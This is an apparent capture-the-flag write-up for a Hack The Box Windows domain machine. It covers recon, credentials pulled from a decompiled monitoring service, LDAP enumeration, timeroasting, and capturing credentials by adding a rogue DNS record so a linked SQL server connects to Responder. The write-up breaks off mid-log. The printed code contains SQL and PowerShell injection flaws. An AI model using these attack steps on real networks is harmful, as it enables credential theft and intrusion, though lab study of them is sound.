# Initial recon 

##### nmap 
```bash
Nmap 7.98 scan initiated Thu Feb 12 13:00:14 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -T4 --min-rate=5000 -oN nmap.txt -p- 10.129.244.81
Nmap scan report for 10.129.244.81
Host is up (0.48s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-12 18:01:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-12T18:02:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-12T18:02:09+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.244.81:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-02-12T18:02:50+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.244.81:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-12T17:54:31
|_Not valid after:  2056-02-12T17:54:31
9389/tcp  open  mc-nmf        .NET Message Framing
51751/tcp open  msrpc         Microsoft Windows RPC
51758/tcp open  msrpc         Microsoft Windows RPC
55626/tcp open  tcpwrapped
62463/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-12T18:02:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 12 13:02:53 2026 -- 1 IP address (1 host up) scanned in 159.00 seconds
```

start enuming SMB with guest user 

```bash 
crackmapexec smb 10.129.244.81 -u 'guest' -p ''           
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\guest: 
```

and we can see shares alse 

```bash 
crackmapexec smb 10.129.244.81 -u 'guest' -p '' --shares  
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\guest: 
SMB         10.129.244.81   445    S200401          [+] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share 
SMB         10.129.244.81   445    S200401          software$       READ            
SMB         10.129.244.81   445    S200401          SYSVOL                          Logon server share 
```

checking `software$`
```bash
smbclient //10.129.244.81/software$ -U 'guest%' 
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                  DH        0  Fri May 16 21:27:07 2025
  ..                                DHS        0  Thu Jan  1 01:46:47 2026
  Monitoring                         DH        0  Fri May 16 21:32:43 2025

                7147007 blocks of size 4096. 1268817 blocks available
smb: \> cd Monitoring 
smb: \Monitoring\> ls 
  .                                  DH        0  Fri May 16 21:32:43 2025
  ..                                 DH        0  Fri May 16 21:27:07 2025
  EntityFramework.dll                AH  4991352  Thu Apr 16 16:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 16:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 16:38:56 2020
  EntityFramework.xml                AH  3738289  Thu Apr 16 16:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 10:46:10 2017
  overwatch.exe                      AH     9728  Fri May 16 21:19:24 2025
  overwatch.exe.config               AH     2163  Fri May 16 21:02:30 2025
  overwatch.pdb                      AH    30208  Fri May 16 21:19:24 2025
  System.Data.SQLite.dll             AH   450232  Sun Sep 29 16:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 16:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 16:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 14:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 10:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 10:46:10 2017
  x64                                DH        0  Fri May 16 21:32:33 2025
  x86                                DH        0  Fri May 16 21:32:33 2025
```

we decompile `overwatch.exe` with `ilspycmd` and we get this 

```cs 
using System;
using System.Collections.ObjectModel;
using System.Data.Common;
using System.Data.SQLite;
using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text;
using System.Timers;
using Microsoft.Win32;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("overwatch")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("overwatch")]
[assembly: AssemblyCopyright("Copyright ©  2025")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("2fc604c8-27b5-4d41-8725-1ad840353d26")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.7.2", FrameworkDisplayName = ".NET Framework 4.7.2")]
[assembly: AssemblyVersion("1.0.0.0")]
[ServiceContract]
public interface IMonitoringService
{
        [OperationContract]
        string StartMonitoring();

        [OperationContract]
        string StopMonitoring();

        [OperationContract]
        string KillProcess(string processName);
}
public class MonitoringService : IMonitoringService
{
        private ManagementEventWatcher processStartWatcher;

        private bool isRunning;

        private readonly string connectionString = "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;";

        public string StartMonitoring()
        {
                //IL_0015: Unknown result type (might be due to invalid IL or missing references)
                //IL_001f: Expected O, but got Unknown
                if (isRunning)
                {
                        return "Already monitoring.";
                }
                SystemEvents.SessionSwitch += new SessionSwitchEventHandler(SystemEvents_SessionSwitch);
                StartProcessWatcher();
                isRunning = true;
                return "Monitoring started.";
        }

        public string StopMonitoring()
        {
                //IL_0015: Unknown result type (might be due to invalid IL or missing references)
                //IL_001f: Expected O, but got Unknown
                if (!isRunning)
                {
                        return "Monitoring not active.";
                }
                SystemEvents.SessionSwitch -= new SessionSwitchEventHandler(SystemEvents_SessionSwitch);
                processStartWatcher.Stop();
                isRunning = false;
                return "Monitoring stopped.";
        }

        private void SystemEvents_SessionSwitch(object sender, SessionSwitchEventArgs e)
        {
                //IL_0001: Unknown result type (might be due to invalid IL or missing references)
                //IL_0006: Unknown result type (might be due to invalid IL or missing references)
                SessionSwitchReason reason = e.Reason;
                string text = ((object)(SessionSwitchReason)(ref reason)).ToString();
                LogEvent("SessionSwitch", "Reason: " + text);
        }

        private void StartProcessWatcher()
        {
                //IL_0005: Unknown result type (might be due to invalid IL or missing references)
                //IL_000b: Expected O, but got Unknown
                //IL_000d: Unknown result type (might be due to invalid IL or missing references)
                //IL_0017: Expected O, but got Unknown
                //IL_0024: Unknown result type (might be due to invalid IL or missing references)
                //IL_002e: Expected O, but got Unknown
                WqlEventQuery val = new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace");
                processStartWatcher = new ManagementEventWatcher((EventQuery)(object)val);
                processStartWatcher.EventArrived += (EventArrivedEventHandler)delegate(object sender, EventArrivedEventArgs e)
                {
                        string text = e.NewEvent.Properties["ProcessName"].Value.ToString();
                        LogEvent("ProcessStart", "Process: " + text);
                };
                processStartWatcher.Start();
        }

        private void LogEvent(string type, string detail)
        {
                //IL_0006: Unknown result type (might be due to invalid IL or missing references)
                //IL_000c: Expected O, but got Unknown
                //IL_0038: Unknown result type (might be due to invalid IL or missing references)
                //IL_0048: Expected O, but got Unknown
                SqlConnection val = new SqlConnection(connectionString);
                try
                {
                        SqlCommand val2 = new SqlCommand("INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), '" + type + "', '" + detail + "')", val);
                        ((DbConnection)(object)val).Open();
                        ((DbCommand)val2).ExecuteNonQuery();
                }
                finally
                {
                        ((IDisposable)val)?.Dispose();
                }
        }

        public string KillProcess(string processName)
        {
                string scriptContents = "Stop-Process -Name " + processName + " -Force";
                try
                {
                        using Runspace runspace = RunspaceFactory.CreateRunspace();
                        runspace.Open();
                        using Pipeline pipeline = runspace.CreatePipeline();
                        pipeline.Commands.AddScript(scriptContents);
                        pipeline.Commands.Add("Out-String");
                        Collection<PSObject> collection = pipeline.Invoke();
                        runspace.Close();
                        StringBuilder stringBuilder = new StringBuilder();
                        foreach (PSObject item in collection)
                        {
                                stringBuilder.AppendLine(item.ToString());
                        }
                        return stringBuilder.ToString();
                }
                catch (Exception ex)
                {
                        return "Error: " + ex.Message;
                }
        }
}
internal class Program
{
        private static void Main(string[] args)
        {
                //IL_000f: Unknown result type (might be due to invalid IL or missing references)
                //IL_0014: Unknown result type (might be due to invalid IL or missing references)
                ServiceHost val = new ServiceHost(typeof(MonitoringService), Array.Empty<Uri>());
                ((CommunicationObject)val).Open();
                Console.WriteLine("Service is running...");
                Timer timer = new Timer(30000.0);
                timer.Elapsed += CheckEdgeHistory;
                timer.Start();
                Console.WriteLine("Press Enter to exit...");
                Console.ReadLine();
                ((CommunicationObject)val).Close();
        }

        private static void CheckEdgeHistory(object sender, ElapsedEventArgs e)
        {
                //IL_002e: Unknown result type (might be due to invalid IL or missing references)
                //IL_0034: Expected O, but got Unknown
                //IL_003a: Unknown result type (might be due to invalid IL or missing references)
                //IL_0040: Expected O, but got Unknown
                string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Default\\History");
                if (!File.Exists(text))
                {
                        return;
                }
                string tempFileName = Path.GetTempFileName();
                File.Copy(text, tempFileName, overwrite: true);
                try
                {
                        SqlConnection val = new SqlConnection("Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;");
                        try
                        {
                                ((DbConnection)(object)val).Open();
                                SqlCommand val2 = new SqlCommand();
                                try
                                {
                                        val2.Connection = val;
                                        SQLiteConnection sQLiteConnection = new SQLiteConnection("Data Source=" + tempFileName + ";Version=3;");
                                        sQLiteConnection.Open();
                                        SQLiteDataReader sQLiteDataReader = new SQLiteCommand("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5", sQLiteConnection).ExecuteReader();
                                        while (sQLiteDataReader.Read())
                                        {
                                                string text2 = sQLiteDataReader["url"].ToString();
                                                string commandText = "INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), 'URLVisit', '" + text2 + "')";
                                                ((DbCommand)(object)val2).CommandText = commandText;
                                                ((DbCommand)(object)val2).ExecuteNonQuery();
                                        }
                                        sQLiteConnection.Close();
                                }
                                finally
                                {
                                        ((IDisposable)val2)?.Dispose();
                                }
                        }
                        finally
                        {
                                ((IDisposable)val)?.Dispose();
                        }
                }
                catch
                {
                }
                finally
                {
                        File.Delete(tempFileName);
                }
        }
}
```

creds found !! 

```
sqlsvc:TI0LKcfHzZw1Vv
```

and we try it on smb 
```bash 
crackmapexec smb 10.129.244.81 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' 
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
                                                                                                                                                                       
┌──(kali㉿kali)-[~/repo/HTB-machines/Overwatch/monitoring]
└─$ crackmapexec smb 10.129.244.81 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --shares 
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
SMB         10.129.244.81   445    S200401          [+] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON        READ            Logon server share 
SMB         10.129.244.81   445    S200401          software$       READ            
SMB         10.129.244.81   445    S200401          SYSVOL          READ            Logon server share 
```

we can have only `SYSVOL` contains something 

```bash
┌──(kali㉿kali)-[~/repo/HTB-machines/Overwatch/monitoring]
└─$ smbclient //10.129.2.138/SYSVOL -U 'overwatch.htb/sqlsvc%TI0LKcfHzZw1Vv'   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 16 20:07:51 2025
  ..                                  D        0  Fri May 16 20:07:51 2025
  overwatch.htb                      Dr        0  Fri May 16 20:07:51 2025

                7147007 blocks of size 4096. 1834047 blocks available
smb: \> cd overwatch.htb 
smb: \overwatch.htb\> ls 
  .                                   D        0  Fri May 16 20:09:52 2025
  ..                                  D        0  Fri May 16 20:07:51 2025
  DfsrPrivate                      DHSr        0  Fri May 16 20:09:52 2025
  Policies                            D        0  Fri May 16 20:08:03 2025
  scripts                             D        0  Fri May 16 20:07:51 2025

                7147007 blocks of size 4096. 1834047 blocks available
smb: \overwatch.htb\> 

```

but nothing in here we move to MSSQL 

```bash 
impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.2.138 -port 6520 -windows-auth
```

```bash 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)> use overwatch ; 
ENVCHANGE(DATABASE): Old Value: master, New Value: overwatch
INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'overwatch'.
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> SELECT TABLE_SCHEMA, TABLE_NAME FROM overwatch.INFORMATION_SCHEMA.TABLES; 
TABLE_SCHEMA   TABLE_NAME   
------------   ----------   
dbo            Eventlog     
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select * from Eventlog ; 
Id   Timestamp   EventType   Details   
--   ---------   ---------   -------   
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> 
```

nothing interresting on the DB but theres other links 

```bash 
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_links 
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> 
```

after further enum nothing found on the mssql althou i get a list of users 

```bash 
netexec ldap 10.129.2.138 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --users 
LDAP        10.129.2.138    389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.2.138    389    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
LDAP        10.129.2.138    389    S200401          [*] Enumerated 105 domain users: overwatch.htb
LDAP        10.129.2.138    389    S200401          -Username-                    -Last PW Set-       -BadPW-  -Description-                                           
LDAP        10.129.2.138    389    S200401          Administrator                 2025-05-16 23:09:35 0        Built-in account for administering the computer/domain  
LDAP        10.129.2.138    389    S200401          Guest                         2025-05-17 00:34:27 0        Built-in account for guest access to the computer/domain
LDAP        10.129.2.138    389    S200401          krbtgt                        2025-05-16 20:08:45 0        Key Distribution Center Service Account                 
LDAP        10.129.2.138    389    S200401          sqlsvc                        2025-05-16 20:47:43 0                                                                
LDAP        10.129.2.138    389    S200401          sqlmgmt                       2025-05-16 21:24:21 0                                                                
LDAP        10.129.2.138    389    S200401          Charlie.Moss                  2025-05-16 23:05:41 0                                                                
LDAP        10.129.2.138    389    S200401          Tracy.Burns                   2025-05-16 23:05:41 0                                                                
LDAP        10.129.2.138    389    S200401          Kathryn.Bryan                 2025-05-16 23:05:41 0                                                                
LDAP        10.129.2.138    389    S200401          Rachael.Thomas                2025-05-16 23:05:41 0                                                                
LDAP        10.129.2.138    389    S200401          Aimee.Smith                   2025-05-16 23:05:41 0                                                                
LDAP        10.129.2.138    389    S200401          Duncan.Freeman                2025-05-16 23:05:41 0                                                                
LDAP        10.129.2.138    389    S200401          John.Begum                    2025-05-16 23:05:42 0                                                                
LDAP        10.129.2.138    389    S200401          Bernard.Hilton                2025-05-16 23:05:42 0                                                                
LDAP        10.129.2.138    389    S200401          Kim.Hargreaves                2025-05-16 23:05:42 0                                                                
LDAP        10.129.2.138    389    S200401          Douglas.Burrows               2025-05-16 23:05:42 0                                                                
LDAP        10.129.2.138    389    S200401          Carole.Murray                 2025-05-16 23:05:42 0                                                                
LDAP        10.129.2.138    389    S200401          Olivia.Quinn                  2025-05-16 23:05:42 0                                                                
LDAP        10.129.2.138    389    S200401          Trevor.Baker                  2025-05-16 23:05:42 0                                                                
LDAP        10.129.2.138    389    S200401          Kenneth.Dennis                2025-05-16 23:05:42 0                                                                
LDAP        10.129.2.138    389    S200401          Jeremy.Marshall               2025-05-16 23:05:43 0                                                                
LDAP        10.129.2.138    389    S200401          Jodie.Jones                   2025-05-16 23:05:43 0                                                                
LDAP        10.129.2.138    389    S200401          Thomas.Lee                    2025-05-16 23:05:43 0                                                                
LDAP        10.129.2.138    389    S200401          Terence.Matthews              2025-05-16 23:05:43 0                                                                
LDAP        10.129.2.138    389    S200401          Colin.Roberts                 2025-05-16 23:05:43 0                                                                
LDAP        10.129.2.138    389    S200401          Aaron.Robinson                2025-05-16 23:05:43 0                                                                
LDAP        10.129.2.138    389    S200401          Amanda.Jenkins                2025-05-16 23:05:44 0                                                                
LDAP        10.129.2.138    389    S200401          Debra.Arnold                  2025-05-16 23:05:44 0                                                                
LDAP        10.129.2.138    389    S200401          Michelle.Willis               2025-05-16 23:05:44 0                                                                
LDAP        10.129.2.138    389    S200401          Kayleigh.Jones                2025-05-16 23:05:44 0                                                                
LDAP        10.129.2.138    389    S200401          Adam.Russell                  2025-05-16 23:05:44 0                                                                
LDAP        10.129.2.138    389    S200401          Tracey.Kelly                  2025-05-16 23:05:44 0                                                                
LDAP        10.129.2.138    389    S200401          Bethan.Dale                   2025-05-16 23:05:44 0                                                                
LDAP        10.129.2.138    389    S200401          Mandy.Wood                    2025-05-16 23:05:44 0                                                                
LDAP        10.129.2.138    389    S200401          Jenna.Phillips                2025-05-16 23:05:45 0                                                                
LDAP        10.129.2.138    389    S200401          Carole.Yates                  2025-05-16 23:05:45 0                                                                
LDAP        10.129.2.138    389    S200401          Graham.Perry                  2025-05-16 23:05:45 0                                                                
LDAP        10.129.2.138    389    S200401          Catherine.Griffiths           2025-05-16 23:05:45 0                                                                
LDAP        10.129.2.138    389    S200401          Shaun.Jackson                 2025-05-16 23:05:45 0                                                                
LDAP        10.129.2.138    389    S200401          Bethan.Rogers                 2025-05-16 23:05:45 0                                                                
LDAP        10.129.2.138    389    S200401          Ellie.Singh                   2025-05-16 23:05:45 0                                                                
LDAP        10.129.2.138    389    S200401          Marie.Allan                   2025-05-16 23:05:46 0                                                                
LDAP        10.129.2.138    389    S200401          Patrick.Holmes                2025-05-16 23:05:46 0                                                                
LDAP        10.129.2.138    389    S200401          Victor.Hopkins                2025-05-16 23:05:46 0                                                                
LDAP        10.129.2.138    389    S200401          Geraldine.Harper              2025-05-16 23:05:46 0                                                                
LDAP        10.129.2.138    389    S200401          George.Todd                   2025-05-16 23:05:46 0                                                                
LDAP        10.129.2.138    389    S200401          Karl.Smith                    2025-05-16 23:05:46 0                                                                
LDAP        10.129.2.138    389    S200401          Jacqueline.Norton             2025-05-16 23:05:46 0                                                                
LDAP        10.129.2.138    389    S200401          Frederick.Murray              2025-05-16 23:05:46 0                                                                
LDAP        10.129.2.138    389    S200401          Joe.Pearce                    2025-05-16 23:05:47 0                                                                
LDAP        10.129.2.138    389    S200401          Paul.Collins                  2025-05-16 23:05:47 0                                                                
LDAP        10.129.2.138    389    S200401          Damien.Edwards                2025-05-16 23:05:47 0                                                                
LDAP        10.129.2.138    389    S200401          Eileen.Phillips               2025-05-16 23:05:47 0                                                                
LDAP        10.129.2.138    389    S200401          Carl.Johnson                  2025-05-16 23:05:47 0                                                                
LDAP        10.129.2.138    389    S200401          Kevin.Newton                  2025-05-16 23:05:47 0                                                                
LDAP        10.129.2.138    389    S200401          Natalie.Higgins               2025-05-16 23:05:47 0                                                                
LDAP        10.129.2.138    389    S200401          Francis.Weston                2025-05-16 23:05:48 0                                                                
LDAP        10.129.2.138    389    S200401          Benjamin.Davison              2025-05-16 23:05:48 0                                                                
LDAP        10.129.2.138    389    S200401          Martin.Kemp                   2025-05-16 23:05:48 0                                                                
LDAP        10.129.2.138    389    S200401          Angela.Jones                  2025-05-16 23:05:48 0                                                                
LDAP        10.129.2.138    389    S200401          Gareth.Ahmed                  2025-05-16 23:05:48 0                                                                
LDAP        10.129.2.138    389    S200401          Deborah.Morgan                2025-05-16 23:05:48 0                                                                
LDAP        10.129.2.138    389    S200401          Grace.Taylor                  2025-05-16 23:05:48 0                                                                
LDAP        10.129.2.138    389    S200401          Roger.Hughes                  2025-05-16 23:05:48 0                                                                
LDAP        10.129.2.138    389    S200401          Albert.Barrett                2025-05-16 23:05:49 0                                                                
LDAP        10.129.2.138    389    S200401          Grace.Curtis                  2025-05-16 23:05:49 0                                                                
LDAP        10.129.2.138    389    S200401          Marilyn.Griffiths             2025-05-16 23:05:49 0                                                                
LDAP        10.129.2.138    389    S200401          Tracey.Barker                 2025-05-16 23:05:49 0                                                                
LDAP        10.129.2.138    389    S200401          Suzanne.Hughes                2025-05-16 23:05:49 0                                                                
LDAP        10.129.2.138    389    S200401          Timothy.Jackson               2025-05-16 23:05:49 0                                                                
LDAP        10.129.2.138    389    S200401          Beverley.Thompson             2025-05-16 23:05:49 0                                                                
LDAP        10.129.2.138    389    S200401          Clare.Bartlett                2025-05-16 23:05:50 0                                                                
LDAP        10.129.2.138    389    S200401          Irene.Johnson                 2025-05-16 23:05:50 0                                                                
LDAP        10.129.2.138    389    S200401          Bernard.Wood                  2025-05-16 23:05:50 0                                                                
LDAP        10.129.2.138    389    S200401          Frank.McCarthy                2025-05-16 23:05:50 0                                                                
LDAP        10.129.2.138    389    S200401          Elaine.Page                   2025-05-16 23:05:50 0                                                                
LDAP        10.129.2.138    389    S200401          Elaine.Walker                 2025-05-16 23:05:50 0                                                                
LDAP        10.129.2.138    389    S200401          Mohammad.Hill                 2025-05-16 23:05:50 0                                                                
LDAP        10.129.2.138    389    S200401          Glenn.Field                   2025-05-16 23:05:50 0                                                                
LDAP        10.129.2.138    389    S200401          Deborah.Martin                2025-05-16 23:05:51 0                                                                
LDAP        10.129.2.138    389    S200401          Gail.Sullivan                 2025-05-16 23:05:51 0                                                                
LDAP        10.129.2.138    389    S200401          Maureen.Kirby                 2025-05-16 23:05:51 0                                                                
LDAP        10.129.2.138    389    S200401          Georgina.Chambers             2025-05-16 23:05:51 0                                                                
LDAP        10.129.2.138    389    S200401          Philip.Harris                 2025-05-16 23:05:51 0                                                                
LDAP        10.129.2.138    389    S200401          Samantha.Scott                2025-05-16 23:05:51 0                                                                
LDAP        10.129.2.138    389    S200401          Ann.Hill                      2025-05-16 23:05:51 0                                                                
LDAP        10.129.2.138    389    S200401          Chloe.Cox                     2025-05-16 23:05:51 0                                                                
LDAP        10.129.2.138    389    S200401          Jamie.Gough                   2025-05-16 23:05:52 0                                                                
LDAP        10.129.2.138    389    S200401          Frederick.Hussain             2025-05-16 23:05:52 0                                                                
LDAP        10.129.2.138    389    S200401          Dean.Hobbs                    2025-05-16 23:05:52 0                                                                
LDAP        10.129.2.138    389    S200401          Danielle.Moore                2025-05-16 23:05:52 0                                                                
LDAP        10.129.2.138    389    S200401          Timothy.Smith                 2025-05-16 23:05:52 0                                                                
LDAP        10.129.2.138    389    S200401          Declan.Stone                  2025-05-16 23:05:52 0                                                                
LDAP        10.129.2.138    389    S200401          Jacob.Wilson                  2025-05-16 23:05:52 0                                                                
LDAP        10.129.2.138    389    S200401          Gary.Elliott                  2025-05-16 23:05:52 0                                                                
LDAP        10.129.2.138    389    S200401          Peter.Slater                  2025-05-16 23:05:53 0                                                                
LDAP        10.129.2.138    389    S200401          Louise.Walton                 2025-05-16 23:05:53 0                                                                
LDAP        10.129.2.138    389    S200401          Brett.Haynes                  2025-05-16 23:05:53 0                                                                
LDAP        10.129.2.138    389    S200401          Elliot.Green                  2025-05-16 23:05:53 0                                                                
LDAP        10.129.2.138    389    S200401          Wendy.Williams                2025-05-16 23:05:53 0                                                                
LDAP        10.129.2.138    389    S200401          Graham.Parker                 2025-05-16 23:05:53 0                                                                
LDAP        10.129.2.138    389    S200401          Abdul.Stevens                 2025-05-16 23:05:53 0                                                                
LDAP        10.129.2.138    389    S200401          Brett.Bailey                  2025-05-16 23:05:54 0                                                                
LDAP        10.129.2.138    389    S200401          Benjamin.Harrison             2025-05-16 23:05:54 0                                                                
LDAP        10.129.2.138    389    S200401          Emily.Cooper                  2025-05-16 23:05:54 0                                                                
LDAP        10.129.2.138    389    S200401          Roger.Spencer                 2025-05-16 23:05:54 0     
```

and i did a timeroast and found these 

```bash 
ython3 timeroast.py 10.129.2.138                 
1000:$sntp-ms$71618587efac35b537d57b4d5529df6e$1c0111e900000000000a170a4c4f434ced39a432878df449e1b8428bffbfcd0aed39c2929395ec65ed39c292939637e5
1106:$sntp-ms$acb5c38b64c989b2d0f584c63ce49c69$1c0111e900000000000a170a4c4f434ced39a4328b1229cee1b8428bffbfcd0aed39c2937f0993fded39c2937f0a1a35
1107:$sntp-ms$b63526c423af3fb1b9217f60edef1d5c$1c0111e900000000000a170a4c4f434ced39a43289ec537ae1b8428bffbfcd0aed39c29381fc5cdded39c29381fcd24e
1108:$sntp-ms$979e95249164216188c48d6b3bb73d52$1c0111e900000000000a170a4c4f434ced39a4328868dd39e1b8428bffbfcd0aed39c293844ffc97ed39c2938450649c
1109:$sntp-ms$18b7af3fdf2879a7c4a77e1427c3f988$1c0111e900000000000a170b4c4f434ced39a4328742ef68e1b8428bffbfcd0aed39c2938742a3e9ed39c293874306e5
```

the hashes are uncrackable 

got stuck for a while then i did dig and i found that server is being queried by another user so wat we need is to query the linked server directly but first we need to setup a fake dns that point to our machine using dnstool 
```bash 
`python3 /usr/share/doc/python3-impacket/examples/dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' --action add --record SQL07 --data 10.10.14.56 --type A 10.129.2.138`
```

we open respounder 
```
sudo responder -I tun0 -v
```

and from mssqlclient we query our fake dns to get the creds 
```
SELECT * FROM openquery([SQL07], 'SELECT 1');
```

got it 
```
[MSSQL] Received connection from 10.129.2.138
[MSSQL] Cleartext Client   : 10.129.2.138
